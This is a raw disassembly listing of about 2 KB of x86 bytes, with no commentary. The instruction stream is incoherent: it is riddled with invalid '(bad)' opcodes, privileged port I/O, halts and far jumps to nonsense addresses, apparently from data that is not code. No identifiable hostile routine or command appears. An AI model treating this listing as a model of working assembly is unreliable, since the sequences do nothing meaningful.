  4055b0:	addr16 loopne 0x405616
  4055b3:	pop    es
  4055b4:	sahf   
  4055b5:	dec    ebp
  4055b6:	fwait
  4055b7:	lock mul DWORD PTR [ecx+0x32]
  4055bb:	out    0xc,al
  4055bd:	inc    esi
  4055be:	push   cs
  4055bf:	push   0xffffff87
  4055c1:	dec    esp
  4055c2:	loopne 0x4055dd
  4055c4:	pinsrw mm0,WORD PTR [esi+edi*8+0x6e],0xce
  4055ca:	js     0x405624
  4055cc:	mov    bl,0xaa
  4055ce:	into   
  4055cf:	(bad)  
  4055d0:	sub    eax,0x4a3fcc4b
  4055d5:	sbb    DWORD PTR [edx-0x54e38aad],esp
  4055db:	leave  
  4055dc:	mov    edx,0x78f31b45
  4055e1:	xchg   ecx,eax
  4055e2:	sub    eax,0x26387c6a
  4055e7:	pusha  
  4055e8:	pop    ds
  4055e9:	ret    
  4055ea:	jmp    0x45377ceb
  4055ef:	inc    esp
  4055f0:	xchg   esp,eax
  4055f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f2:	gs mov dh,0xad
  4055f5:	mov    eax,0x1a335700
  4055fa:	jl     0x405662
  4055fc:	call   0x29bc:0xb24e5133
  405603:	fisub  WORD PTR [ebp-0x22]
  405606:	sub    DWORD PTR [edx+eax*1+0x3b],eax
  40560a:	sub    eax,0xb6be4ce2
  40560f:	dec    ecx
  405610:	mov    dl,0xec
  405612:	shr    BYTE PTR [edi],cl
  405614:	mov    WORD PTR [eax],es
  405616:	jo     0x4055a5
  405618:	inc    ebx
  405619:	cdq    
  40561a:	out    dx,eax
  40561b:	xchg   edx,eax
  40561c:	std    
  40561d:	push   ebp
  40561e:	pop    ecx
  40561f:	inc    eax
  405621:	(bad)  
  405622:	loope  0x405682
  405624:	xchg   esp,eax
  405625:	aaa    
  405626:	repz inc ecx
  405628:	add    ecx,DWORD PTR [eax-0x32]
  40562b:	jmp    0x9fd5:0x7fb5dada
  405632:	loop   0x405681
  405634:	push   ebp
  405635:	iret   
  405636:	rcpps  xmm2,XMMWORD PTR [esi]
  405639:	jmp    0x405683
  40563b:	cli    
  40563c:	pop    ecx
  40563d:	adc    BYTE PTR [edi+edx*8],bh
  405640:	std    
  405641:	popa   
  405642:	mov    bl,BYTE PTR ds:0xcf3e4a61
  405648:	sbb    al,0x7a
  40564a:	xchg   esi,eax
  40564b:	je     0x405623
  40564d:	cmp    BYTE PTR [eax-0x28],dh
  405650:	(bad)  
  405652:	mov    ds:0x921b4cd5,al
  405657:	out    dx,al
  405658:	loopne 0x4056c7
  40565a:	sub    BYTE PTR [esi-0x359a0abd],ch
  405660:	push   ebx
  405661:	scas   eax,DWORD PTR es:[edi]
  405662:	fstp   DWORD PTR [esi-0x34]
  405665:	push   ecx
  405666:	push   es
  405667:	(bad)  
  405669:	loope  0x40561e
  40566b:	add    eax,0x656d5161
  405670:	sti    
  405671:	in     al,dx
  405672:	sub    DWORD PTR [esi-0xdc18ad2],ebx
  405678:	scas   al,BYTE PTR es:[edi]
  405679:	call   0x78208cc5
  40567e:	mul    DWORD PTR [ebx-0x1b]
  405681:	adc    DWORD PTR [ebx],ebx
  405683:	lock lods eax,DWORD PTR ds:[esi]
  405685:	shl    bh,1
  405687:	pop    es
  405688:	push   0x4f58db5b
  40568d:	fsqrt  
  40568f:	cmp    esi,DWORD PTR [edi+0x6d]
  405692:	cmp    al,0x71
  405694:	jmp    0x5cb7c37f
  405699:	loopne 0x4056fe
  40569b:	xlat   BYTE PTR ds:[ebx]
  40569c:	push   esp
  40569d:	dec    esp
  40569e:	push   cs
  40569f:	push   0x1f
  4056a1:	mov    ebx,0x874e3946
  4056a6:	nop
  4056a7:	push   es
  4056a8:	push   ds
  4056a9:	in     al,0x2e
  4056ab:	test   DWORD PTR [ebp-0x48],ecx
  4056ae:	jecxz  0x4056d7
  4056b0:	mov    edi,0x12372f
  4056b5:	jp     0x405668
  4056b7:	addr16 sub ebx,eax
  4056ba:	sub    cl,BYTE PTR [ecx]
  4056bc:	jo     0x405672
  4056be:	push   eax
  4056bf:	outs   dx,BYTE PTR ds:[esi]
  4056c0:	sbb    bh,BYTE PTR [eax-0x22]
  4056c3:	into   
  4056c4:	mov    DWORD PTR [edx+ebx*2-0xce000e2],esp
  4056cb:	xchg   edi,eax
  4056cc:	(bad)  
  4056cd:	push   esp
  4056ce:	int3   
  4056cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d0:	enter  0x7362,0x16
  4056d4:	pushf  
  4056d5:	fucomi st,st(5)
  4056d7:	xchg   esi,eax
  4056d8:	mov    dh,0xf0
  4056da:	and    BYTE PTR [eax+0x25],dl
  4056dd:	cs jl  0x405736
  4056e0:	mov    al,ds:0xe991111a
  4056e5:	inc    eax
  4056e6:	push   ebx
  4056e7:	rol    BYTE PTR [ebx+ebp*8-0x2e],cl
  4056eb:	or     edx,DWORD PTR [esi]
  4056ed:	add    eax,0x2af395f2
  4056f2:	out    0xbd,eax
  4056f4:	ins    DWORD PTR es:[edi],dx
  4056f5:	jmp    0x984b:0x45d77b7e
  4056fc:	lods   al,BYTE PTR ds:[esi]
  4056fd:	and    eax,0xf863e221
  405702:	push   eax
  405703:	stos   DWORD PTR es:[edi],eax
  405704:	sahf   
  405705:	lahf   
  405706:	mov    ecx,0x63edac8b
  40570b:	test   eax,0xe0029ff4
  405710:	mov    BYTE PTR [ebp+0x4f],al
  405713:	in     al,0x21
  405715:	repz mov ch,0xa5
  405718:	stos   DWORD PTR es:[edi],eax
  405719:	addr16 mov edi,0x42ece47b
  40571f:	cmp    BYTE PTR [esi+0x29],dl
  405722:	icebp  
  405723:	mov    edi,DWORD PTR [edi-0x40]
  405726:	loop   0x4056b2
  405728:	xor    al,0x22
  40572a:	inc    eax
  40572b:	test   al,0xea
  40572d:	cmp    DWORD PTR [esi],0x4c
  405730:	fnstcw WORD PTR [eax+0x28]
  405733:	mov    ecx,0x91251b64
  405738:	xor    bl,bl
  40573a:	loopne 0x40571e
  40573c:	inc    edx
  40573d:	fwait
  40573e:	mov    eax,ds:0xe2256723
  405743:	dec    DWORD PTR [esi+eax*2]
  405746:	add    al,BYTE PTR [eax+0xccf0f3a]
  40574c:	fmul   st,st(3)
  40574e:	sbb    eax,0x3d604013
  405753:	ins    BYTE PTR es:[edi],dx
  405754:	jmp    0x4d10:0xd1ededfd
  40575b:	xchg   BYTE PTR [ebx+0x2990cc5e],bh
  405761:	test   ebp,esp
  405763:	push   edx
  405764:	inc    ecx
  405765:	call   0x5cfd:0xa1acfa78
  40576c:	ror    BYTE PTR ds:0x5d80cf1c,1
  405772:	stc    
  405773:	sbb    ebp,ecx
  405775:	mov    ds:0xe1e0994e,al
  40577a:	sbb    ch,BYTE PTR [esi+0x44]
  40577d:	imul   BYTE PTR [esi+eiz*1]
  405780:	(bad)  
  405781:	push   edx
  405782:	adc    DWORD PTR [edi-0x5bc34eb6],ebp
  405788:	pop    ecx
  405789:	dec    ebp
  40578a:	fwait
  40578b:	jnp    0x4057c8
  40578d:	sbb    DWORD PTR fs:[esi+edi*8+0xcd512e5],esi
  405795:	aam    0xca
  405797:	out    dx,eax
  405798:	lods   eax,DWORD PTR ds:[esi]
  405799:	inc    esi
  40579a:	xchg   esi,eax
  40579b:	inc    esi
  40579c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40579d:	xor    ebx,DWORD PTR [esi+edx*4]
  4057a0:	jmp    0x40576a
  4057a2:	out    dx,eax
  4057a3:	outs   dx,BYTE PTR ds:[esi]
  4057a4:	fwait
  4057a5:	push   es
  4057a6:	retf   
  4057a7:	mov    ds:0xc228ae87,eax
  4057ac:	(bad)  
  4057ad:	aam    0x3b
  4057af:	sbb    ah,BYTE PTR [ecx]
  4057b1:	mov    cs,WORD PTR [ebx+0x6e5e1f6]
  4057b7:	and    dl,bl
  4057b9:	sar    BYTE PTR [eax-0x4a],1
  4057bc:	retf   
  4057bd:	arpl   si,bp
  4057bf:	retf   0x59db
  4057c2:	sbb    edi,DWORD PTR [ebp+0x1d]
  4057c5:	lods   al,BYTE PTR ds:[esi]
  4057c6:	(bad)  
  4057c7:	leave  
  4057c8:	out    dx,eax
  4057c9:	stos   BYTE PTR es:[edi],al
  4057ca:	out    0xcc,eax
  4057cc:	and    edi,edx
  4057ce:	mov    cl,0x3e
  4057d0:	jo     0x4057d0
  4057d2:	inc    ebx
  4057d3:	sti    
  4057d4:	xor    al,dh
  4057d6:	(bad)  
  4057d7:	or     edi,DWORD PTR [eax-0x5293c033]
  4057dd:	pop    es
  4057de:	imul   esp,DWORD PTR [esi+edx*1],0x65
  4057e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057e3:	(bad)  
  4057e4:	addr16 jae 0x4057d7
  4057e7:	jmp    0xbe68:0x4e6e336
  4057ee:	mov    cl,0xdf
  4057f0:	and    edi,DWORD PTR [eax+0x3d]
  4057f3:	je     0x405852
  4057f5:	lea    ecx,[ebx+0x7]
  4057f8:	sub    edx,edx
  4057fa:	pop    ds
  4057fb:	mov    dl,0x6
  4057fd:	add    BYTE PTR [ebx+esi*2+0x7f5775ff],bl
  405804:	xor    DWORD PTR [esi-0x6d],edi
  405807:	adc    esp,ebp
  405809:	mov    bh,BYTE PTR [edx+0x7e5ce902]
  40580f:	and    ah,BYTE PTR ds:0xf729f2c3
  405815:	ins    DWORD PTR es:[edi],dx
  405816:	out    dx,al
  405817:	pop    ebp
  405818:	mov    bl,0xa2
  40581a:	ins    BYTE PTR es:[edi],dx
  40581b:	shl    BYTE PTR [edi],cl
  40581d:	mov    ebp,0x9d8cadd4
  405822:	jmp    0x98872511
  405827:	mov    WORD PTR [ebx],fs
  405829:	bound  edi,QWORD PTR [ebp-0x5084c74]
  40582f:	dec    edi
  405830:	xchg   esi,eax
  405831:	sub    DWORD PTR [eax-0x35],edi
  405834:	rcl    cl,1
  405836:	mov    edi,0x10177c51
  40583b:	cld    
  40583c:	mov    ds:0xac01f75,eax
  405841:	mov    ds:0x3198cdf7,eax
  405846:	cmp    esp,ebp
  405848:	int3   
  405849:	out    dx,eax
  40584a:	mov    bl,0xd8
  40584c:	ret    0x7c33
  40584f:	xchg   edi,eax
  405850:	cs scas al,BYTE PTR es:[edi]
  405852:	jmp    0x74d2967c
  405857:	enter  0xea03,0x76
  40585b:	dec    eax
  40585c:	bound  ebx,QWORD PTR [esi+0x71f5a061]
  405862:	xchg   esi,eax
  405863:	jmp    0x4058ab
  405865:	mov    ds:0xed72c9c4,eax
  40586a:	dec    esi
  40586b:	pop    ecx
  40586c:	jbe    0x40586d
  40586e:	fsub   QWORD PTR [ebp+0x2d]
  405871:	sti    
  405872:	or     cl,bl
  405874:	cdq    
  405875:	fwait
  405876:	aas    
  405877:	inc    ebp
  405878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405879:	shl    BYTE PTR [ebx+0x1eb8c644],1
  40587f:	jmp    0x4058cc
  405881:	adc    edx,esi
  405883:	mov    ecx,0x95811438
  405888:	call   0x50f3a82a
  40588d:	push   cs
  40588e:	sbb    al,0xd0
  405890:	mov    eax,ds:0x209e5904
  405895:	and    bl,ch
  405897:	aad    0xe0
  405899:	retf   0x48cc
  40589c:	leave  
  40589d:	mov    dl,0xc7
  40589f:	jle    0x4058c0
  4058a1:	xchg   edx,eax
  4058a2:	xor    edx,DWORD PTR [edx-0x55881241]
  4058a8:	(bad)  
  4058a9:	loopne 0x405927
  4058ab:	rcr    DWORD PTR ds:0xd997fc84,1
  4058b1:	cmp    DWORD PTR ds:0x2cb1f71,ecx
  4058b7:	hlt    
  4058b8:	fsub   st,st(0)
  4058ba:	jle    0x4058d7
  4058bc:	jmp    0x8c1c:0x2db15b62
  4058c3:	adc    eax,0x8cf7f526
  4058c8:	retf   0xaa8c
  4058cb:	cmc    
  4058cc:	jno    0x405935
  4058ce:	jecxz  0x405902
  4058d0:	addr16 inc edx
  4058d2:	popf   
  4058d3:	scas   al,BYTE PTR es:[edi]
  4058d4:	xor    al,0xa9
  4058d6:	call   0x6435:0x8f80917a
  4058dd:	mov    ds:0x85573300,eax
  4058e2:	imul   ecx,DWORD PTR [ebp-0x44532d36],0x1068af4e
  4058ec:	(bad)  
  4058ed:	push   ss
  4058ee:	add    bl,BYTE PTR [edi-0x7ca56f1c]
  4058f4:	imul   eax,DWORD PTR [eax+0x7a],0xe4a1b738
  4058fb:	mov    edi,0xd45e0b7c
  405900:	std    
  405901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405902:	push   cs
  405903:	sbb    eax,0x983c9eb3
  405908:	scas   al,BYTE PTR es:[edi]
  405909:	pop    ds
  40590a:	(bad)  
  40590b:	rcl    edi,1
  40590d:	out    0xbd,al
  40590f:	mov    eax,ds:0xc586128e
  405914:	sbb    ecx,ebx
  405916:	push   ebp
  405917:	es dec edx
  405919:	cmp    ch,BYTE PTR [esi-0x72f731dc]
  40591f:	stos   BYTE PTR es:[edi],al
  405920:	ret    
  405921:	push   es
  405922:	fisub  DWORD PTR [edi]
  405924:	clc    
  405925:	mov    ds:0x8106fc08,eax
  40592a:	test   dh,bl
  40592c:	xor    ebx,DWORD PTR [ebx+0x36]
  40592f:	(bad)
  405932:	fcomp  st(7)
  405934:	in     al,dx
  405935:	fimul  DWORD PTR [ecx-0x23]
  405938:	inc    esi
  405939:	add    BYTE PTR [esi-0x17f48d87],bh
  40593f:	outs   dx,DWORD PTR ds:[esi]
  405940:	ret    
  405941:	push   edx
  405942:	mov    cl,0x28
  405944:	ja     0x4058c7
  405946:	xor    bl,BYTE PTR [ebp+esi*1+0x37]
  40594a:	sbb    al,dl
  40594c:	sahf   
  40594d:	xor    BYTE PTR [eiz*1-0x7617edfe],bh
  405954:	sti    
  405955:	or     eax,0x230abb41
  40595a:	fcomp  DWORD PTR [esi]
  40595c:	mov    eax,ds:0xe2b65e4a
  405961:	fist   DWORD PTR [ebx]
  405963:	repz adc BYTE PTR [ebx+0x3e7f1336],0xf8
  40596b:	sbb    bh,BYTE PTR [edx+0x11]
  40596e:	inc    esp
  40596f:	mov    ch,0xd0
  405971:	jge    0x4059ad
  405973:	pop    ecx
  405974:	inc    esi
  405975:	lahf   
  405976:	fild   QWORD PTR ds:0x9f5ef37c
  40597c:	push   edi
  40597d:	cwde   
  40597e:	mov    DWORD PTR [edx+0x2f698b31],ebp
  405984:	mov    ds:0x222c15f1,eax
  405989:	outs   dx,BYTE PTR ds:[esi]
  40598a:	sbb    ebx,0xffffffce
  40598d:	fs adc ah,ch
  405990:	js     0x405993
  405992:	add    DWORD PTR [ebx+ebp*4-0x80],0xffffffda
  405997:	in     eax,dx
  405998:	jnp    0x4059cf
  40599a:	add    bh,ch
  40599c:	cmp    DWORD PTR [ebp+edi*4+0x3befd0bd],edi
  4059a3:	mov    edx,0x3772c1b1
  4059a8:	and    eax,0x32688f20
  4059ad:	lods   eax,DWORD PTR fs:[esi]
  4059af:	cs call 0xcfd6dfa8
  4059b5:	mov    al,ds:0x88ca9f15
  4059ba:	pop    ebp
  4059bb:	or     DWORD PTR [esi+edx*8+0x50],edx
  4059bf:	fnsave [esi]
  4059c1:	and    esp,esi
  4059c3:	ins    BYTE PTR es:[edi],dx
  4059c4:	stos   BYTE PTR es:[edi],al
  4059c5:	das    
  4059c6:	or     eax,0xcd49ecc7
  4059cb:	sbb    eax,0x8d479bbd
  4059d0:	aaa    
  4059d1:	and    BYTE PTR [esi-0x5a422258],cl
  4059d7:	cmp    dl,BYTE PTR [edx-0xe495f1]
  4059dd:	es hlt 
  4059df:	pop    ds
  4059e0:	xchg   ebx,eax
  4059e1:	mov    ebp,0xaf787270
  4059e6:	dec    esi
  4059e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e8:	sub    al,0xd3
  4059ea:	or     al,0xe0
  4059ec:	lods   eax,DWORD PTR ds:[esi]
  4059ed:	fprem1 
  4059ef:	into   
  4059f0:	mov    dh,0xce
  4059f2:	xlat   BYTE PTR ds:[ebx]
  4059f3:	jnp    0x405981
  4059f5:	jnp    0x405a1d
  4059f7:	push   ebp
  4059f8:	push   ebp
  4059f9:	adc    cl,BYTE PTR [edx+0x1b]
  4059fc:	jg     0x4059c0
  4059fe:	xchg   ebp,ebx
  405a00:	imul   DWORD PTR [esi]
  405a02:	lods   eax,DWORD PTR ds:[esi]
  405a03:	pushf  
  405a04:	mov    ah,dh
  405a06:	inc    ebx
  405a07:	mov    eax,0x8120afd0
  405a0c:	(bad)  
  405a0d:	sub    dl,bl
  405a0f:	cmp    DWORD PTR [ecx-0x2af0ddd2],edi
  405a15:	aad    0x41
  405a17:	sbb    DWORD PTR [edx-0x72912a6b],edx
  405a1d:	sub    eax,0xd6fa1364
  405a22:	aas    
  405a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a24:	in     eax,dx
  405a25:	xchg   DWORD PTR [edx+0x53],esp
  405a28:	pop    eax
  405a29:	xchg   esp,eax
  405a2a:	test   eax,0xf531aeb7
  405a2f:	push   ecx
  405a30:	fnstsw WORD PTR [ecx+edx*4]
  405a33:	sub    al,0x51
  405a35:	pushf  
  405a36:	push   eax
  405a37:	inc    ebx
  405a38:	mov    ch,0xab
  405a3a:	pop    ds
  405a3b:	dec    ecx
  405a3c:	in     eax,0x1e
  405a3e:	fisubr DWORD PTR [ecx]
  405a40:	repnz shl BYTE PTR gs:[edx-0x3ee4e847],1
  405a48:	xchg   esp,eax
  405a49:	arpl   WORD PTR [edi+0x35],sp
  405a4c:	shl    edi,1
  405a4e:	mov    DWORD PTR [esi-0x51],edx
  405a51:	sti    
  405a52:	xchg   BYTE PTR [eax],dl
  405a54:	sub    eax,0x6175578d
  405a59:	mov    ch,0x60
  405a5b:	mov    eax,0x1b56c855
  405a60:	int    0x6d
  405a62:	aas    
  405a63:	mov    ds:0x603901e7,al
  405a68:	mov    ebp,0xe5e65619
  405a6d:	jae    0x405a4c
  405a6f:	imul   BYTE PTR [edx]
  405a71:	or     BYTE PTR [esi],al
  405a73:	mov    edx,0x429b91f5
  405a78:	pop    es
  405a79:	test   esi,eax
  405a7b:	mov    ch,0xb1
  405a7d:	jo     0x405ae8
  405a7f:	and    al,0xdb
  405a81:	sbb    ah,BYTE PTR [eax]
  405a83:	mov    ebp,0xb7674e56
  405a88:	adc    bl,BYTE PTR [edx+0x1a]
  405a8b:	push   eax
  405a8c:	into   
  405a8d:	mov    es,WORD PTR [eax+0x39331331]
  405a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a94:	xchg   edi,eax
  405a95:	dec    ebp
  405a96:	sbb    esp,DWORD PTR [ecx]
  405a98:	lock or edi,ebx
  405a9b:	stos   DWORD PTR es:[edi],eax
  405a9c:	xchg   ebp,eax
  405a9d:	js     0x405a78
  405a9f:	cli    
  405aa0:	retf   0xb840
  405aa3:	xchg   ah,al
  405aa5:	xor    BYTE PTR [ebp+0x65a777b4],al
  405aab:	push   edx
  405aac:	je     0x405a69
  405aae:	outs   dx,BYTE PTR ds:[esi]
  405aaf:	xchg   edi,eax
  405ab0:	cmp    al,0xf5
  405ab2:	jne    0x405a97
  405ab4:	add    esi,DWORD PTR [edx-0x6]
  405ab7:	jb     0x405ab3
  405ab9:	sahf   
  405aba:	adc    eax,0xf7b84067
  405abf:	pop    ds
  405ac0:	mov    BYTE PTR [eax+eiz*4-0xe347e83],ah
  405ac7:	mov    ds:0x70f36f3a,eax
  405acc:	add    eax,0x92fd6a99
  405ad1:	test   DWORD PTR [ecx-0x4b],ebx
  405ad4:	(bad)  
  405ad5:	fmul   DWORD PTR [edi+0x7e]
  405ad8:	or     BYTE PTR [eax+0x77],0xc5
  405adc:	mov    eax,0xc6e1c654
  405ae1:	jge    0x405b54
  405ae3:	xlat   BYTE PTR ds:[ebx]
  405ae4:	xchg   dl,bh
  405ae6:	lods   eax,DWORD PTR ds:[esi]
  405ae7:	sti    
  405ae8:	and    BYTE PTR [edx+0x11],bl
  405aeb:	push   edx
  405aec:	inc    ebx
  405aed:	sbb    ah,BYTE PTR [edi-0x1b1c17af]
  405af3:	in     al,dx
  405af4:	fisub  WORD PTR [edi]
  405af6:	mov    al,ds:0x897ec04d
  405afb:	mov    edx,0x741c91ac
  405b00:	shl    DWORD PTR [esi-0x77],0x88
  405b04:	addr16 out 0xb8,eax
  405b07:	test   eax,0x668ac63f
  405b0c:	enter  0x462f,0xea
  405b10:	sbb    ebp,DWORD PTR [eax-0x5bc5aa5a]
  405b16:	adc    ch,BYTE PTR [edi-0x5f41c532]
  405b1c:	sub    al,0x42
  405b1e:	cmc    
  405b1f:	jbe    0x405b37
  405b21:	add    edi,DWORD PTR [edi+0x32eeafd0]
  405b27:	iret   
  405b28:	cmp    eax,0x34703653
  405b2d:	xor    ebp,0x5aa10c6
  405b33:	xchg   esp,eax
  405b34:	xor    BYTE PTR [ecx*8+0x8b8ebf4],ah
  405b3b:	icebp  
  405b3c:	and    dh,BYTE PTR [edi-0x28]
  405b3f:	nop
  405b40:	stos   DWORD PTR es:[edi],eax
  405b41:	pop    esp
  405b42:	sub    BYTE PTR [edx+0x6f56cf07],0x4a
  405b49:	push   ss
  405b4a:	cs jle 0x405b7f
  405b4d:	lahf   
  405b4e:	aaa    
  405b4f:	adc    ah,dh
  405b51:	pop    edi
  405b52:	sub    eax,0x4543a60c
  405b57:	das    
  405b58:	adc    bl,BYTE PTR [ebx]
  405b5a:	sub    eax,0x1fa16c63
  405b5f:	imul   edx,ebx,0xb3710caf
  405b65:	stc    
  405b66:	rcr    DWORD PTR [eax-0x64587f07],cl
  405b6c:	mov    bl,BYTE PTR [ebx-0x8]
  405b6f:	sahf   
  405b70:	mov    ch,0x90
  405b72:	cmp    DWORD PTR [eax+0x1f58f48b],ebp
  405b78:	shl    BYTE PTR [ebx],0xea
  405b7b:	push   ss
  405b7c:	inc    esp
  405b7d:	aam    0xdb
  405b7f:	out    0xfa,eax
  405b81:	bound  edx,QWORD PTR [edx]
  405b83:	lods   al,BYTE PTR ds:[esi]
  405b84:	inc    edi
  405b85:	xchg   edi,eax
  405b86:	cmp    eax,0xdf8fdb1a
  405b8b:	and    dh,BYTE PTR [eax+0x51cc1c01]
  405b91:	xor    BYTE PTR [edi-0x6236ec9b],ah
  405b97:	or     al,0x6d
  405b99:	push   ecx
  405b9a:	test   al,0x33
  405b9c:	out    0x13,al
  405b9e:	pop    esi
  405b9f:	mov    esp,0xb43c3f66
  405ba4:	mov    ah,0x6b
  405ba6:	lods   al,BYTE PTR ds:[esi]
  405ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba8:	pop    eax
  405ba9:	test   BYTE PTR [ebx-0x7c2dbfb1],dh
  405baf:	dec    esi
  405bb1:	out    dx,eax
  405bb2:	dec    esp
  405bb3:	xor    BYTE PTR [eax],bl
  405bb5:	fisub  DWORD PTR [eax]
  405bb7:	bound  ecx,QWORD PTR [esi]
  405bb9:	and    DWORD PTR [ebx+0x3c],edx
  405bbc:	icebp  
  405bbd:	test   BYTE PTR [ebx],dh
  405bbf:	xchg   ebp,eax
  405bc0:	fld    TBYTE PTR [edi]
  405bc2:	sub    bl,al
  405bc4:	add    al,0xde
  405bc6:	bound  edi,QWORD PTR [ebx+0x318464b3]
  405bcc:	xchg   ebp,eax
  405bcd:	test   eax,0x18bcd249
  405bd2:	push   esi
  405bd3:	mov    eax,0x2be1f0ab
  405bd8:	sub    edx,DWORD PTR [edx+0x1e5f1d6f]
  405bde:	inc    DWORD PTR [ebx]
  405be0:	jle    0x405c18
  405be2:	dec    edi
  405be3:	in     al,0xcd
  405be5:	xchg   BYTE PTR [eax],cl
  405be7:	sbb    eax,0xf4bfc6bb
  405bec:	pushf  
  405bed:	cdq    
  405bee:	mov    gs,WORD PTR [ebp+0x6d]
  405bf1:	jns    0x405bbf
  405bf3:	idiv   BYTE PTR [esi-0x40475ec1]
  405bf9:	fisttp DWORD PTR [eax]
  405bfb:	(bad)  
  405bfc:	pop    edx
  405bfd:	(bad)  
  405bfe:	sub    DWORD PTR [eax],0x32
  405c01:	sub    edi,ebp
  405c03:	aaa    
  405c04:	inc    esi
  405c05:	jg     0x405c16
  405c07:	scas   al,BYTE PTR es:[edi]
  405c08:	pop    ebx
  405c09:	fstp   st(3)
  405c0b:	mov    ebp,0xb8d83603
  405c10:	mov    bh,0x18
  405c12:	mov    ?,WORD PTR [esi-0x72]
  405c15:	lods   eax,DWORD PTR ds:[esi]
  405c16:	push   eax
  405c17:	sub    ecx,0x63b0df99
  405c1d:	not    BYTE PTR [ecx+0x28]
  405c20:	(bad)  
  405c21:	dec    esi
  405c22:	mov    al,0xd5
  405c24:	pop    eax
  405c25:	cld    
  405c26:	repnz push edi
  405c28:	pop    edi
  405c29:	gs pop esp
  405c2c:	xor    eax,0x949426b7
  405c31:	adc    eax,0x3d3ce020
  405c36:	scas   eax,DWORD PTR es:[edi]
  405c37:	add    bl,BYTE PTR [esi-0x24]
  405c3a:	or     ebp,DWORD PTR [esi+0x7a]
  405c3d:	and    dl,BYTE PTR [esi+0x3a5c46f4]
  405c43:	(bad)  
  405c44:	(bad)  [ebx+0x706b8b8b]
  405c4a:	sub    cl,al
  405c4c:	dec    edx
  405c4d:	setns  ah
  405c50:	xor    esi,DWORD PTR [esi+0x1aa9ae89]
  405c56:	mov    ds:0xfb0cb7ed,al
  405c5b:	in     eax,0x8d
  405c5d:	inc    esi
  405c5e:	cmp    eax,DWORD PTR ds:0xe0e1d710
  405c64:	push   edx
  405c65:	dec    edx
  405c66:	js     0x405bf8
  405c68:	test   BYTE PTR [edx+0x67a55f96],dl
  405c6e:	adc    al,dh
  405c70:	jge    0x405c5c
  405c72:	xor    DWORD PTR [ecx],eax
  405c74:	cmp    eax,0x2a2c603c
  405c79:	sub    eax,edx
  405c7b:	aam    0x2c
  405c7d:	cwde   
  405c7e:	xor    dl,BYTE PTR [ecx]
  405c80:	fs in  eax,0x82
  405c83:	cmovs  ebp,ebp
  405c86:	or     al,0x16
  405c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c89:	daa    
  405c8a:	out    dx,al
  405c8b:	ret    0xa508
  405c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c8f:	xor    bl,BYTE PTR [eax-0x5d]
  405c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c93:	gs push 0xfeed3f60
  405c99:	pop    esi
  405c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c9b:	xlat   BYTE PTR ds:[ebx]
  405c9c:	loope  0x405cfd
  405c9e:	jae    0x405c6d
  405ca0:	jle    0x405ca7
  405ca2:	mov    esp,0x5597726f
  405ca7:	sub    DWORD PTR [edi+0x3d],esp
  405caa:	inc    edi
  405cab:	jmp    0x405c31
  405cad:	outs   dx,BYTE PTR ds:[esi]
  405cae:	sub    eax,0x22088d0c
  405cb3:	repz shl BYTE PTR [ecx+0x79],0xcd
  405cb8:	cld    
  405cb9:	xchg   ecx,eax
  405cba:	xchg   edx,eax
  405cbb:	and    al,0x4
  405cbd:	outs   dx,DWORD PTR ds:[esi]
  405cbe:	rol    bl,1
  405cc0:	int3   
  405cc1:	adc    esi,ebp
  405cc3:	ret    
  405cc4:	push   ebp
  405cc5:	rol    DWORD PTR [ebp-0x7fb2536c],cl
  405ccb:	shl    BYTE PTR [eax+0x49ff5934],cl
  405cd1:	mov    esi,ebp
  405cd3:	pusha  
  405cd4:	aad    0xc8
  405cd6:	xor    al,0x84
  405cd8:	sub    BYTE PTR [ebx+0x3f7e95a1],0x3e
  405cdf:	push   esp
  405ce0:	and    DWORD PTR [esi+esi*4],0x610cb194
  405ce7:	add    al,0x56
  405ce9:	adc    al,0x48
  405ceb:	xor    al,0x57
  405ced:	enter  0x603c,0x3a
  405cf1:	test   eax,0x344d52ba
  405cf6:	outs   dx,DWORD PTR ds:[esi]
  405cf7:	fwait
  405cf8:	pop    esi
  405cf9:	test   DWORD PTR [edx],esi
  405cfb:	mov    edi,0x5be52166
  405d00:	mov    ecx,DWORD PTR [ecx-0x39]
  405d03:	retf   0x4125
  405d06:	bound  eax,QWORD PTR [edi-0x2]
  405d09:	mov    ah,0x41
  405d0b:	pop    ebp
  405d0c:	cli    
  405d0d:	push   esp
  405d0e:	retf   
  405d0f:	addr16 loop 0x405d64
  405d12:	jg     0x405c9f
  405d14:	push   esi
  405d15:	inc    eax
  405d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d17:	rcl    esp,cl
  405d19:	(bad)  
  405d1a:	push   esp
  405d1b:	xchg   esi,eax
  405d1c:	jb     0x405d36
  405d1e:	and    DWORD PTR [ecx-0x4f],edx
  405d21:	or     eax,0x38ae2bdb
  405d26:	adc    DWORD PTR [ebx],edx
  405d28:	(bad)  
  405d29:	xor    edi,ecx
  405d2b:	int    0xc4
  405d2d:	call   0x970a77d7
  405d32:	pop    ebp
  405d33:	inc    edi
  405d34:	xlat   BYTE PTR ds:[ebx]
  405d35:	adc    esi,ebp
  405d37:	sbb    eax,0xc9ab893a
  405d3c:	fwait
  405d3d:	dec    edi
  405d3e:	mov    bh,0xd1
  405d40:	pop    esi
  405d41:	inc    edi
  405d42:	adc    al,0xeb
  405d44:	jb     0x405d2e
  405d46:	xchg   ebp,eax
  405d47:	dec    esi
  405d48:	lahf   
  405d49:	bound  ecx,QWORD PTR [ecx+0x2773d9d4]
  405d4f:	(bad)  
  405d50:	jnp    0x405d3e
  405d52:	hlt    
  405d53:	xchg   esp,eax
  405d54:	pop    edi
  405d55:	pop    ss
  405d56:	jmp    0xc6a40c4
  405d5b:	(bad)  
  405d5d:	int3   
